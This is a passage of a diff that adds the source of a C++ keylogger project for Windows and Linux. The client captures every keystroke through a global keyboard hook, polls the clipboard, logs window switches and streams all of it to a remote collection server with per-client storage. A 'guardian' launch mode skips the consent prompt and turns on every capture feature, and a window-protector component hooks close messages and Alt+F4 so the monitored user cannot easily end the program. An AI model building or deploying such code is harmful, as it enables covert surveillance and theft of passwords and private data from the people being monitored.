@@ -1,0 +1,4183 @@
+===== DIRECTORY TREE =====
+.
+├── cc1.txt
+├── cc2.txt
+├── client
+├── client_cross.hpp
+├── client_main.cpp
+├── clipboard_monitor.hpp
+├── clipboard_monitor_windows.hpp
+├── guardian_exit
+├── guardian_exit.cpp
+├── guardian_exit_windows.cpp
+├── keyboard_capture.hpp
+├── keyboard_capture_windows.hpp
+├── launcher
+├── launcher_common.hpp
+├── launcher_linux.cpp
+├── launcher_windows_simple.cpp
+├── meowkey.binary
+├── password_dialog_linux.hpp
+├── password_dialog_windows.hpp
+├── platform_detector.hpp
+├── process_guard_linux.hpp
+├── process_guard_windows.hpp
+├── server
+├── Server
+│   ├── dashboard.html
+│   ├── events.hpp
+│   ├── server_cross.hpp
+│   ├── server_main.cpp
+│   └── unified_storage.hpp
+├── socket_utils_cross.hpp
+├── thread_safe_queue.hpp
+├── window_monitor.hpp
+├── window_monitor_windows.hpp
+└── window_protector.hpp
+
+2 directories, 33 files
+===== FILE: ./client_cross.hpp =====
+#ifndef CLIENT_CROSS_HPP
+#define CLIENT_CROSS_HPP
+
+#include "platform_detector.hpp"
+#include "socket_utils_cross.hpp"
+#include "thread_safe_queue.hpp"
+#include <thread>
+#include <atomic>
+#include <iostream>
+#include <memory>
+using namespace std; 
+
+#ifdef PLATFORM_WINDOWS
+    #include "keyboard_capture_windows.hpp"
+    #include "clipboard_monitor_windows.hpp"
+    #include "window_monitor_windows.hpp"
+    typedef KeyboardCaptureWindows KeyboardCapture;
+    typedef ClipboardMonitorWindows ClipboardMonitor;
+    typedef WindowMonitorWindows WindowMonitor;
+#else
+    #include "keyboard_capture.hpp"
+    #include "clipboard_monitor.hpp"
+    #include "window_monitor.hpp"
+#endif
+
+class Client {
+private:
+      string server_host_;
+    int server_port_;
+      string client_id_;
+      atomic<bool> running_;
+      thread network_thread_;
+    ThreadSafeQueue<  string> event_queue_;
+      unique_ptr<KeyboardCapture> keyboard_capture_;
+      unique_ptr<ClipboardMonitor> clipboard_monitor_;
+      unique_ptr<WindowMonitor> window_monitor_;
+    bool enable_clipboard_monitoring_;
+    bool enable_window_monitoring_;
+    bool skip_consent_; // NEW: Skip consent if launched by guardian
+
+public:
+    Client(const   string& host, int port, const   string& client_id, bool skip_consent = false) 
+        : server_host_(host), server_port_(port), client_id_(client_id),
+          running_(false), enable_clipboard_monitoring_(false), 
+          enable_window_monitoring_(false), skip_consent_(skip_consent) {}
+
+    ~Client() {
+        stop();
+    }
+
+    bool start() {
+        if (running_) {
+            return false;
+        }
+
+        running_ = true;
+        
+        // Get user consent (skip if launched by guardian)
+        if (!skip_consent_) {
+            if (!getUserConsent()) {
+                  cout << "Consent not granted. Exiting." <<   endl;
+                return false;
+            }
+        } else {
+            // Auto-consent when launched by guardian
+              cout << "=== PROTECTED MODE ===" <<   endl;
+              cout << "Running under guardian protection" <<   endl;
+              cout << "All monitoring features enabled" <<   endl;
+            enable_clipboard_monitoring_ = true;
+            enable_window_monitoring_ = true;
+        }
+
+        // Initialize keyboard capture
+        try {
+            keyboard_capture_ =   make_unique<KeyboardCapture>(
+                [this](const   string& key) {
+                    event_queue_.push("KEY: " + key);
+                }
+            );
+        } catch (const   exception& e) {
+              cerr << "Failed to initialize keyboard capture: " << e.what() <<   endl;
+            return false;
+        }
+
+        // Initialize clipboard monitor if consented
+        if (enable_clipboard_monitoring_) {
+            try {
+                clipboard_monitor_ =   make_unique<ClipboardMonitor>(
+                    [this](const   string& content) {
+                        event_queue_.push(content);
+                    }
+                );
+            } catch (const   exception& e) {
+                  cerr << "Failed to initialize clipboard monitor: " << e.what() <<   endl;
+            }
+        }
+
+        // Initialize window monitor if consented
+        if (enable_window_monitoring_) {
+            try {
+                window_monitor_ =   make_unique<WindowMonitor>(
+                    [this](const   string& window_info) {
+                        event_queue_.push(window_info);
+                    }
+                );
+            } catch (const   exception& e) {
+                  cerr << "Failed to initialize window monitor: " << e.what() <<   endl;
+            }
+        }
+
+        // Start keyboard capture
+        if (!keyboard_capture_->start()) {
+              cerr << "Failed to start keyboard capture" <<   endl;
+            return false;
+        }
+
+        // Start clipboard monitoring if enabled
+        if (clipboard_monitor_ && !clipboard_monitor_->start()) {
+              cerr << "Failed to start clipboard monitoring" <<   endl;
+        }
+
+        // Start window monitoring if enabled
+        if (window_monitor_ && !window_monitor_->start()) {
+              cerr << "Failed to start window monitoring" <<   endl;
+        }
+
+          cout << "Client ID: " << client_id_ <<   endl;
+          cout << "Keyboard device: " << keyboard_capture_->getKeyboardDevice() <<   endl;
+        if (enable_clipboard_monitoring_) {
+              cout << "Clipboard monitoring: ENABLED" <<   endl;
+        }
+        if (enable_window_monitoring_) {
+              cout << "Window monitoring: ENABLED" <<   endl;
+        }
+
+        // Start network thread
+        network_thread_ =   thread(&Client::networkLoop, this);
+
+          cout << "Client started. Capturing input events..." <<   endl;
+        return true;
+    }
+
+    void stop() {
+        running_ = false;
+        if (keyboard_capture_) {
+            keyboard_capture_->stop();
+        }
+        if (clipboard_monitor_) {
+            clipboard_monitor_->stop();
+        }
+        if (window_monitor_) {
+            window_monitor_->stop();
+        }
+        if (network_thread_.joinable()) {
+            network_thread_.join();
+        }
+        SocketUtils::cleanupWSA();
+    }
+
+private:
+    bool getUserConsent() {
+          cout << "=== INPUT MONITORING CLIENT ===" <<   endl;
+          cout << "Client ID: " << client_id_ <<   endl;
+          cout << "This application will capture:" <<   endl;
+          cout << "1. ALL keystrokes on your system" <<   endl;
+          cout << "2. Clipboard content when it changes" <<   endl;
+          cout << "3. Active window/tab information when you switch" <<   endl;
+          cout << "and send them to the server at " << server_host_ << ":" << server_port_ <<   endl;
+          cout <<   endl;
+          cout << "WARNING: This may capture sensitive information!" <<   endl;
+          cout <<   endl;
+        
+          string response;
+          cout << "Do you give permission for keyboard monitoring? (yes/no): ";
+          getline(  cin, response);
+        bool keyboard_consent = (response == "yes" || response == "y" || response == "YES" || response == "Y");
+        
+        if (!keyboard_consent) {
+            return false;
+        }
+        
+          cout << "Do you also give permission for clipboard monitoring? (yes/no): ";
+          getline(  cin, response);
+        enable_clipboard_monitoring_ = (response == "yes" || response == "y" || response == "YES" || response == "Y");
+        
+        if (enable_clipboard_monitoring_) {
+              cout << "CLIPBOARD WARNING: This will capture ALL copied text including passwords!" <<   endl;
+              cout << "Are you sure? (yes/no): ";
+              getline(  cin, response);
+            enable_clipboard_monitoring_ = (response == "yes" || response == "y" || response == "YES" || response == "Y");
+        }
+        
+          cout << "Do you also give permission for window/tab monitoring? (yes/no): ";
+          getline(  cin, response);
+        enable_window_monitoring_ = (response == "yes" || response == "y" || response == "YES" || response == "Y");
+        
+        return true;
+    }
+
+    void networkLoop() {
+        while (running_) {
+            try {
+                int sockfd = SocketUtils::createSocket();
+                SocketUtils::connectToServer(sockfd, server_host_, server_port_);
+                
+                // Send client ID first
+                  string hello_msg = "CLIENT_ID: " + client_id_ + "\n";
+                SocketUtils::sendData(sockfd, hello_msg);
+                
+                  cout << "Connected to server successfully!" <<   endl;
+
+                while (running_) {
+                    auto event_opt = event_queue_.pop();
+                    if (event_opt) {
+                          string message = *event_opt + "\n";
+                        if (!SocketUtils::sendData(sockfd, message)) {
+                              cerr << "Failed to send data. Reconnecting..." <<   endl;
+                            break;
+                        }
+                    }
+                    
+                      this_thread::sleep_for(  chrono::milliseconds(10));
+                }
+
+                close(sockfd);
+            } catch (const   exception& e) {
+                  cerr << "Connection error: " << e.what() << ". Retrying in 5 seconds..." <<   endl;
+                  this_thread::sleep_for(  chrono::seconds(5));
+            }
+        }
+    }
+};
+
+#endif
+===== FILE: ./clipboard_monitor.hpp =====
+#ifndef CLIPBOARD_MONITOR_HPP
+#define CLIPBOARD_MONITOR_HPP
+
+#include <X11/Xlib.h>
+#include <X11/Xutil.h>
+#include <X11/Xatom.h>  // ADDED: For XA_STRING and other atom definitions
+#include <iostream>
+#include <string>
+#include <thread>
+#include <atomic>
+#include <functional>
+#include <cstring>
+#include <algorithm>
+using namespace std; 
+
+class ClipboardMonitor {
+private:
+      atomic<bool> monitoring_;
+      thread monitor_thread_;
+      function<void(const   string&)> callback_;
+    Display* display_;
+    Window window_;
+    Atom clipboard_atom_;
+    Atom utf8_string_atom_;
+    Atom text_plain_atom_;
+      string last_clipboard_content_;
+    static const size_t MAX_CLIPBOARD_SIZE = 10240; // 10KB limit
+
+public:
+    ClipboardMonitor(  function<void(const   string&)> callback) 
+        : monitoring_(false), callback_(callback), display_(nullptr), window_(0) {}
+
+    ~ClipboardMonitor() {
+        stop();
+    }
+
+    bool start() {
+        if (monitoring_) {
+            return false;
+        }
+
+        // Initialize X11 display
+        display_ = XOpenDisplay(nullptr);
+        if (!display_) {
+              cerr << "Failed to open X11 display. Make sure you're running in a graphical environment." <<   endl;
+            return false;
+        }
+
+        // Create a hidden window to receive clipboard events
+        int screen = DefaultScreen(display_);
+        window_ = XCreateSimpleWindow(display_, RootWindow(display_, screen),
+                                     0, 0, 1, 1, 0, 0, 0);
+        
+        clipboard_atom_ = XInternAtom(display_, "CLIPBOARD", False);
+        utf8_string_atom_ = XInternAtom(display_, "UTF8_STRING", False);
+        text_plain_atom_ = XInternAtom(display_, "text/plain", False);
+        
+        // If UTF8_STRING is not available, fall back to standard atoms
+        if (utf8_string_atom_ == None) {
+            utf8_string_atom_ = XInternAtom(display_, "STRING", False);
+        }
+
+        monitoring_ = true;
+        monitor_thread_ =   thread(&ClipboardMonitor::monitorLoop, this);
+        
+          cout << "Clipboard monitoring started" <<   endl;
+        return true;
+    }
+
+    void stop() {
+        monitoring_ = false;
+        if (monitor_thread_.joinable()) {
+            monitor_thread_.join();
+        }
+        if (display_) {
+            if (window_) {
+                XDestroyWindow(display_, window_);
+            }
+            XCloseDisplay(display_);
+            display_ = nullptr;
+        }
+          cout << "Clipboard monitoring stopped" <<   endl;
+    }
+
+    bool isMonitoring() const {
+        return monitoring_;
+    }
+
+private:
+    void monitorLoop() {
+        // Get initial clipboard content
+          string initial_content = getClipboardText();
+        if (!initial_content.empty()) {
+            last_clipboard_content_ = initial_content;
+        }
+
+        while (monitoring_) {
+              string current_content = getClipboardText();
+            
+            if (!current_content.empty() && current_content != last_clipboard_content_) {
+                // Truncate if too long for display
+                  string display_content = current_content;
+                if (display_content.length() > 100) {
+                    display_content = display_content.substr(0, 100) + "...";
+                }
+                
+                  cout << "Clipboard changed: " << display_content <<   endl;
+                
+                if (callback_) {
+                    // Send truncated version if too large
+                    if (current_content.length() > MAX_CLIPBOARD_SIZE) {
+                          string truncated = current_content.substr(0, MAX_CLIPBOARD_SIZE) + "...[TRUNCATED]";
+                        callback_("CLIPBOARD: " + truncated);
+                    } else {
+                        callback_("CLIPBOARD: " + current_content);
+                    }
+                }
+                
+                last_clipboard_content_ = current_content;
+            }
+            
+              this_thread::sleep_for(  chrono::milliseconds(500));
+        }
+    }
+
+      string getClipboardText() {
+        if (!display_) {
+            return "";
+        }
+
+        XEvent event;
+          string result;
+
+        // Try multiple target types in order of preference
+        Atom targets[] = {
+            utf8_string_atom_,
+            text_plain_atom_,
+            XA_STRING
+        };
+        
+        const int num_targets = sizeof(targets) / sizeof(targets[0]);
+
+        for (int i = 0; i < num_targets; i++) {
+            if (targets[i] == None) continue;
+            
+            // Request clipboard content
+            XConvertSelection(display_, clipboard_atom_, targets[i], 
+                             clipboard_atom_, window_, CurrentTime);
+            XFlush(display_);
+
+            // Wait for selection notify with timeout
+            time_t start_time = time(nullptr);
+            bool got_data = false;
+            
+            while (time(nullptr) - start_time < 2) { // 2 second timeout
+                if (XPending(display_)) {
+                    XNextEvent(display_, &event);
+                    
+                    if (event.type == SelectionNotify && 
+                        event.xselection.selection == clipboard_atom_) {
+                        
+                        if (event.xselection.property != None) {
+                            Atom actual_type;
+                            int actual_format;
+                            unsigned long nitems, bytes_after;
+                            unsigned char* data = nullptr;
+                            
+                            if (XGetWindowProperty(display_, window_, 
+                                                 event.xselection.property,
+                                                 0, MAX_CLIPBOARD_SIZE, False, 
+                                                 AnyPropertyType,
+                                                 &actual_type, &actual_format,
+                                                 &nitems, &bytes_after, &data) == Success) {
+                                
+                                if (data && nitems > 0 && actual_format == 8) {
+                                    result =   string(reinterpret_cast<char*>(data), nitems);
+                                    
+                                    // Clean up: remove non-printable characters except newlines and tabs
+                                    result.erase(  remove_if(result.begin(), result.end(),
+                                        [](char c) { 
+                                            return (c < 32 && c != '\n' && c != '\t' && c != '\r') || c == 127; 
+                                        }), result.end());
+                                    
+                                    got_data = true;
+                                }
+                                
+                                if (data) {
+                                    XFree(data);
+                                }
+                                
+                                // Delete the property to clean up
+                                XDeleteProperty(display_, window_, event.xselection.property);
+                            }
+                        }
+                        break;
+                    }
+                }
+                  this_thread::sleep_for(  chrono::milliseconds(10));
+            }
+            
+            if (got_data && !result.empty()) {
+                break;
+            }
+        }
+
+        return result;
+    }
+};
+
+#endif
+===== FILE: ./keyboard_capture_windows.hpp =====
+#ifndef KEYBOARD_CAPTURE_WINDOWS_HPP
+#define KEYBOARD_CAPTURE_WINDOWS_HPP
+
+#ifdef PLATFORM_WINDOWS
+
+#include <windows.h>
+#include <string>
+#include <thread>
+#include <atomic>
+#include <functional>
+#include <unordered_map>
+#include <iostream>
+using namespace std; 
+class KeyboardCaptureWindows {
+private:
+      atomic<bool> capturing_;
+      thread capture_thread_;
+      function<void(const   string&)> callback_;
+    static KeyboardCaptureWindows* instance_;
+    static HHOOK hook_handle_;
+
+public:
+    KeyboardCaptureWindows(  function<void(const   string&)> callback) 
+        : capturing_(false), callback_(callback) {
+        instance_ = this;
+    }
+
+    ~KeyboardCaptureWindows() {
+        stop();
+        instance_ = nullptr;
+    }
+
+    bool start() {
+        if (capturing_) {
+            return false;
+        }
+
+        capturing_ = true;
+        capture_thread_ =   thread(&KeyboardCaptureWindows::captureLoop, this);
+        return true;
+    }
+
+    void stop() {
+        capturing_ = false;
+        if (hook_handle_) {
+            UnhookWindowsHookEx(hook_handle_);
+            hook_handle_ = nullptr;
+        }
+        if (capture_thread_.joinable()) {
+            capture_thread_.join();
+        }
+    }
+
+    bool isCapturing() const {
+        return capturing_;
+    }
+
+      string getKeyboardDevice() const {
+        return "Windows Keyboard Hook";
+    }
+
+private:
+    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+        if (nCode >= 0 && instance_) {
+            if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
+                KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
+                  string key_name = instance_->vkCodeToString(pKeyboard->vkCode);
+                
+                if (!key_name.empty() && instance_->callback_) {
+                      cout << "Captured key: " << key_name <<   endl;
+                    instance_->callback_(key_name);
+                }
+            }
+        }
+        return CallNextHookEx(hook_handle_, nCode, wParam, lParam);
+    }
+
+    void captureLoop() {
+          cout << "Starting Windows keyboard capture..." <<   endl;
+         
+        hook_handle_ = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
+        if (!hook_handle_) {
+              cerr << "Failed to install keyboard hook!" <<   endl;
+            return;
+        }
+
+          cout << "✓ Keyboard hook installed. Capturing keystrokes..." <<   endl;
+
+        MSG msg;
+        while (capturing_ && GetMessage(&msg, NULL, 0, 0)) {
+            TranslateMessage(&msg);
+            DispatchMessage(&msg);
+        }
+    }
+
+      string vkCodeToString(DWORD vkCode) {
+        static const   unordered_map<DWORD,   string> key_map = {
+            {'A', "A"}, {'B', "B"}, {'C', "C"}, {'D', "D"}, {'E', "E"},
+            {'F', "F"}, {'G', "G"}, {'H', "H"}, {'I', "I"}, {'J', "J"},
+            {'K', "K"}, {'L', "L"}, {'M', "M"}, {'N', "N"}, {'O', "O"},
+            {'P', "P"}, {'Q', "Q"}, {'R', "R"}, {'S', "S"}, {'T', "T"},
+            {'U', "U"}, {'V', "V"}, {'W', "W"}, {'X', "X"}, {'Y', "Y"},
+            {'Z', "Z"},
+            {'0', "0"}, {'1', "1"}, {'2', "2"}, {'3', "3"}, {'4', "4"},
+            {'5', "5"}, {'6', "6"}, {'7', "7"}, {'8', "8"}, {'9', "9"},
+            {VK_SPACE, "SPACE"}, {VK_RETURN, "ENTER"}, {VK_BACK, "BACKSPACE"},
+            {VK_TAB, "TAB"}, {VK_ESCAPE, "ESC"}, {VK_CONTROL, "CTRL"},
+            {VK_SHIFT, "SHIFT"}, {VK_MENU, "ALT"},
+            {VK_OEM_COMMA, ","}, {VK_OEM_PERIOD, "."}, {VK_OEM_2, "/"}, 
+            {VK_OEM_1, ";"}, {VK_OEM_7, "'"}, {VK_OEM_4, "["}, 
+            {VK_OEM_6, "]"}, {VK_OEM_5, "\\"}, {VK_OEM_MINUS, "-"}, 
+            {VK_OEM_PLUS, "="}, {VK_OEM_3, "`"},
+            {VK_UP, "UP"}, {VK_DOWN, "DOWN"}, {VK_LEFT, "LEFT"}, {VK_RIGHT, "RIGHT"},
+            {VK_F1, "F1"}, {VK_F2, "F2"}, {VK_F3, "F3"}, {VK_F4, "F4"},
+            {VK_F5, "F5"}, {VK_F6, "F6"}, {VK_F7, "F7"}, {VK_F8, "F8"},
+            {VK_F9, "F9"}, {VK_F10, "F10"}, {VK_F11, "F11"}, {VK_F12, "F12"}
+        };
+
+        auto it = key_map.find(vkCode);
+        if (it != key_map.end()) {
+            return it->second;
+        }
+        return "KEY_" +   to_string(vkCode);
+    }
+};
+
+KeyboardCaptureWindows* KeyboardCaptureWindows::instance_ = nullptr;
+HHOOK KeyboardCaptureWindows::hook_handle_ = nullptr;
+
+#endif // PLATFORM_WINDOWS
+#endif
+===== FILE: ./platform_detector.hpp =====
+
+#ifndef PLATFORM_DETECTOR_HPP
+#define PLATFORM_DETECTOR_HPP
+
+// Platform detection macros
+#if defined(_WIN32) || defined(_WIN64)
+    #define PLATFORM_WINDOWS
+#elif defined(__linux__)
+    #define PLATFORM_LINUX
+#else
+    #error "Unsupported platform"
+#endif
+
+#endif
+===== FILE: ./window_protector.hpp =====
+#ifndef WINDOW_PROTECTOR_HPP
+#define WINDOW_PROTECTOR_HPP
+
+#ifdef PLATFORM_WINDOWS
+
+#include <windows.h>
+#include <tlhelp32.h>
+#include <string>
+#include <vector>
+#include <iostream>
+#include <atomic>
+#include <thread>
+#include <unordered_set>
+#include "password_dialog_windows.hpp"
+using namespace std; 
+
+class WindowProtector {
+private: 
+    DWORD targetPID;
+      atomic<bool> protecting_;
+      thread protectionThread_;
+      unordered_set<HWND> hookedWindows_;
+    HHOOK keyboardHook_;
+    static WindowProtector* instance_;
+    static   atomic<bool>* exit_authorized_ptr_;
+    
+    // Store original window procedures
+    static   unordered_map<HWND, WNDPROC> originalProcs_;
+    
+public:
+    WindowProtector(DWORD pid,   atomic<bool>& exit_auth) 
+        : targetPID(pid), protecting_(false), keyboardHook_(NULL) {
+        instance_ = this;
+        exit_authorized_ptr_ = &exit_auth;
+    }
+    
+    ~WindowProtector() {
+        stop();
+        instance_ = nullptr;
+    }
+    
+    bool start() {
+        if (protecting_) return false;
+        
+        protecting_ = true;
+        
+        // Install global keyboard hook for Alt+F4
+        keyboardHook_ = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardHookProc, 
+                                          GetModuleHandleA(NULL), 0);
+        
+        if (!keyboardHook_) {
+              cerr << "⚠️  Failed to install keyboard hook" <<   endl;
+        }
+        
+        // Start window monitoring thread
+        protectionThread_ =   thread(&WindowProtector::protectionLoop, this);
+        
+          cout << "🛡️  Window protection active - monitoring PID " << targetPID <<   endl;
+        return true;
+    }
+    
+    void stop() {
+        protecting_ = false;
+        
+        if (keyboardHook_) {
+            UnhookWindowsHookEx(keyboardHook_);
+            keyboardHook_ = NULL;
+        }
+        
+        // Restore original window procedures
+        for (auto& pair : originalProcs_) {
+            SetWindowLongPtrA(pair.first, GWLP_WNDPROC, (LONG_PTR)pair.second);
+        }
+        originalProcs_.clear();
+        
+        if (protectionThread_.joinable()) {
+            protectionThread_.join();
+        }
+    }
+    
+private:
+    void protectionLoop() {
+        while (protecting_) {
+            // Find all windows belonging to target process
+            findAndHookWindows();
+              this_thread::sleep_for(  chrono::milliseconds(500));
+        }
+    }
+    
+    void findAndHookWindows() {
+        EnumWindows([](HWND hwnd, LPARAM lParam) -> BOOL {
+            WindowProtector* self = (WindowProtector*)lParam;
+            
+            DWORD windowPID;
+            GetWindowThreadProcessId(hwnd, &windowPID);
+            
+            if (windowPID == self->targetPID) {
+                // Check if this window is already hooked
+                if (self->hookedWindows_.find(hwnd) == self->hookedWindows_.end()) {
+                    self->hookWindow(hwnd);
+                }
+            }
+            
+            return TRUE;
+        }, (LPARAM)this);
+    }
+    
+    void hookWindow(HWND hwnd) {
+        // Only hook top-level visible windows
+        if (!IsWindowVisible(hwnd)) return;
+        if (GetWindow(hwnd, GW_OWNER) != NULL) return;
+        
+        char className[256];
+        GetClassNameA(hwnd, className, sizeof(className));
+        
+        // Skip system windows
+        if (strcmp(className, "IME") == 0) return;
+        if (strcmp(className, "MSCTFIME UI") == 0) return;
+        
+        // Subclass the window
+        WNDPROC originalProc = (WNDPROC)GetWindowLongPtrA(hwnd, GWLP_WNDPROC);
+        
+        if (originalProc && originalProc != ProtectedWindowProc) {
+            originalProcs_[hwnd] = originalProc;
+            SetWindowLongPtrA(hwnd, GWLP_WNDPROC, (LONG_PTR)ProtectedWindowProc);
+            SetWindowLongPtrA(hwnd, GWLP_USERDATA, (LONG_PTR)this);
+            
+            hookedWindows_.insert(hwnd);
+            
+            char title[256];
+            GetWindowTextA(hwnd, title, sizeof(title));
+              cout << "🔒 Protected window: " << (title[0] ? title : className) 
+                      << " (HWND: " << hwnd << ")" <<   endl;
+        }
+    }
+    
+    static LRESULT CALLBACK ProtectedWindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
+        // Get original procedure
+        WNDPROC originalProc = nullptr;
+        auto it = originalProcs_.find(hwnd);
+        if (it != originalProcs_.end()) {
+            originalProc = it->second;
+        }
+        
+        // Intercept close messages
+        if (msg == WM_CLOSE) {
+              cout << "\n🚨 Window close attempt intercepted!" <<   endl;
+            
+            if (instance_ && exit_authorized_ptr_) {
+                if (instance_->handleCloseAttempt(hwnd)) {
+                    // Password correct - allow close
+                    if (originalProc) {
+                        return CallWindowProcA(originalProc, hwnd, msg, wParam, lParam);
+                    }
+                } else {
+                    // Password incorrect - block close
+                    return 0;
+                }
+            }
+            return 0;
+        }
+        
+        // Intercept system commands (Alt+F4, etc.)
+        if (msg == WM_SYSCOMMAND) {
+            if (wParam == SC_CLOSE) {
+                  cout << "\n🚨 System close command intercepted!" <<   endl;
+                
+                if (instance_ && exit_authorized_ptr_) {
+                    if (!instance_->handleCloseAttempt(hwnd)) {
+                        return 0; // Block
+                    }
+                }
+            }
+        }
+        
+        // Call original window procedure
+        if (originalProc) {
+            return CallWindowProcA(originalProc, hwnd, msg, wParam, lParam);
+        }
+        
+        return DefWindowProcA(hwnd, msg, wParam, lParam);
+    }
+    
+    bool handleCloseAttempt(HWND hwnd) {
+        char title[256];
+        GetWindowTextA(hwnd, title, sizeof(title));
+        
+          cout << "🔐 Password required to close: " << title <<   endl;
+        
+        if (PasswordDialogWindows::showPasswordDialog()) {
+              cout << "✅ Password correct - Close authorized" <<   endl;
+            
+            if (exit_authorized_ptr_) {
+                *exit_authorized_ptr_ = true;
+            }
+            
+            return true;
+        } else {
+              cout << "❌ Incorrect password - Close blocked\n" <<   endl;
+            return false;
+        }
+    }
+    
+    static LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
+        if (nCode >= 0 && instance_) {
+            if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
+                KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
+                
+                // Check for Alt+F4
+                if (kbd->vkCode == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) {
+                    // Check if the foreground window belongs to our process
+                    HWND fgWindow = GetForegroundWindow();
+                    DWORD fgPID;
+                    GetWindowThreadProcessId(fgWindow, &fgPID);
+                    
+                    if (fgPID == instance_->targetPID) {
+                          cout << "\n🚨 Alt+F4 intercepted!" <<   endl;
+                        
+                        if (!instance_->handleCloseAttempt(fgWindow)) {
+                            return 1; // Block Alt+F4
+                        }
+                    }
+                }
+            }
+        }
+        
+        return CallNextHookEx(instance_->keyboardHook_, nCode, wParam, lParam);
+    }
+};
+
+WindowProtector* WindowProtector::instance_ = nullptr;
+  atomic<bool>* WindowProtector::exit_authorized_ptr_ = nullptr;
+  unordered_map<HWND, WNDPROC> WindowProtector::originalProcs_;
+
+#endif // PLATFORM_WINDOWS
+#endif
+===== FILE: ./Server/unified_storage.hpp =====
+#ifndef UNIFIED_STORAGE_HPP
+#define UNIFIED_STORAGE_HPP
+
+#include <cstdint>
+#include <cstring>
+#include <string>
+#include <fcntl.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <iostream>
+#include <vector>
+#include <map>
+
+using namespace std;
+
+static const uint64_t MAX_FILE_SIZE = 100 * 1024 * 1024; // 100MB hard limit
+static const uint32_t UNIFIED_MAGIC = 0x4D454F57; // "MEOW"
+
+// File header (4096 bytes - one page)
+struct UnifiedStorageHeader {
+    uint32_t magic;
+    uint32_t version;
+    uint64_t file_size;
+    uint64_t max_size;
+    uint64_t client_index_offset;
+    uint64_t data_section_offset;
+    uint32_t num_clients;
+    uint32_t next_client_id;
+    uint8_t padding[4040];
+};
+
+// Client entry (256 bytes)
+struct ClientEntry {
+    char client_id[64];
+    uint8_t is_active;
+    uint32_t session_count;
+    uint64_t keystrokes_count;
+    uint64_t clipboard_count;
+    uint64_t window_count;
+    uint64_t data_start_offset;
+    uint64_t data_end_offset;
+    uint64_t last_activity;
+    uint8_t padding[144];
+    
+    ClientEntry() {
+        memset(this, 0, sizeof(*this));
+    }
+    
+    bool isEmpty() const {
+        return client_id[0] == '\0';
+    }
+};
+
+// Data record header (32 bytes)
+struct DataRecordHeader {
+    uint8_t record_type;       // 1=keystroke, 2=clipboard, 3=window
+    uint8_t flags;
+    uint16_t client_index;
+    uint32_t record_size;
+    uint64_t timestamp;
+    uint8_t padding[16];
+};
+
+class UnifiedStorage {
+private:
+    string filename_;
+    int fd_;
+    UnifiedStorageHeader header_;
+    map<string, uint16_t> client_id_to_index_;
+    vector<ClientEntry> client_cache_;
+    
+    bool readHeader() {
+        lseek(fd_, 0, SEEK_SET);
+        ssize_t bytes = read(fd_, &header_, sizeof(header_));
+        return bytes == sizeof(header_);
+    }
+    
+    bool writeHeader() {
+        lseek(fd_, 0, SEEK_SET);
+        ssize_t bytes = write(fd_, &header_, sizeof(header_));
+        fsync(fd_);
+        return bytes == sizeof(header_);
+    }
+    
+    bool loadClientCache() {
+        client_cache_.clear();
+        client_id_to_index_.clear();
+        
+        if (header_.num_clients == 0) return true;
+        
+        uint64_t offset = header_.client_index_offset;
+        lseek(fd_, offset, SEEK_SET);
+        
+        for (uint32_t i = 0; i < header_.num_clients; i++) {
+            ClientEntry entry;
+            ssize_t bytes = read(fd_, &entry, sizeof(entry));
+            if (bytes != sizeof(entry)) return false;
+            
+            if (!entry.isEmpty()) {
+                client_cache_.push_back(entry);
+                client_id_to_index_[string(entry.client_id)] = i;
+            }
+        }
+        
+        return true;
+    }
+    
+    bool saveClientEntry(uint16_t index, const ClientEntry& entry) {
+        uint64_t offset = header_.client_index_offset + (index * sizeof(ClientEntry));
+        lseek(fd_, offset, SEEK_SET);
+        ssize_t bytes = write(fd_, &entry, sizeof(entry));
+        return bytes == sizeof(entry);
+    }
+    
+    uint64_t getCurrentFileSize() {
+        struct stat st;
+        fstat(fd_, &st);
+        return st.st_size;
+    }
+    
+    bool hasSpaceForRecord(size_t record_size) {
+        uint64_t current_size = getCurrentFileSize();
+        uint64_t needed = sizeof(DataRecordHeader) + record_size;
+        return (current_size + needed) <= MAX_FILE_SIZE;
+    }
+    
+public:
+    UnifiedStorage(const string& filename) : filename_(filename), fd_(-1) {}
+    
+    ~UnifiedStorage() {
+        close();
+    }
+    
+    bool open() {
+        fd_ = ::open(filename_.c_str(), O_RDWR | O_CREAT, 0644);
+        if (fd_ < 0) {
+            cerr << "Failed to open unified storage: " << filename_ << endl;
+            return false;
+        }
+        
+        struct stat st;
+        fstat(fd_, &st);
+        
+        if (st.st_size == 0) {
+            // Initialize new file
+            memset(&header_, 0, sizeof(header_));
+            header_.magic = UNIFIED_MAGIC;
+            header_.version = 1;
+            header_.max_size = MAX_FILE_SIZE;
+            header_.file_size = sizeof(UnifiedStorageHeader);
+            header_.client_index_offset = sizeof(UnifiedStorageHeader);
+            header_.data_section_offset = sizeof(UnifiedStorageHeader) + (1000 * sizeof(ClientEntry));
+            header_.num_clients = 0;
+            header_.next_client_id = 1;
+            
+            if (!writeHeader()) {
+                cerr << "Failed to write initial header" << endl;
+                ::close(fd_);
+                fd_ = -1;
+                return false;
+            }
+            
+            // Initialize client index section
+            ClientEntry empty_entry;
+            lseek(fd_, header_.client_index_offset, SEEK_SET);
+            for (int i = 0; i < 1000; i++) {
+                write(fd_, &empty_entry, sizeof(empty_entry));
+            }
+            
+            fsync(fd_);
+        } else {
+            if (!readHeader()) {
+                cerr << "Failed to read unified storage header" << endl;
+                ::close(fd_);
+                fd_ = -1;
+                return false;
+            }
+            
+            if (header_.magic != UNIFIED_MAGIC) {
+                cerr << "Invalid magic number in unified storage" << endl;
+                ::close(fd_);
+                fd_ = -1;
+                return false;
+            }
+        }
+        
+        if (!loadClientCache()) {
+            cerr << "Failed to load client cache" << endl;
+            ::close(fd_);
+            fd_ = -1;
+            return false;
+        }
+        
+        return true;
+    }
+    
+    void close() {
+        if (fd_ >= 0) {
+            writeHeader();
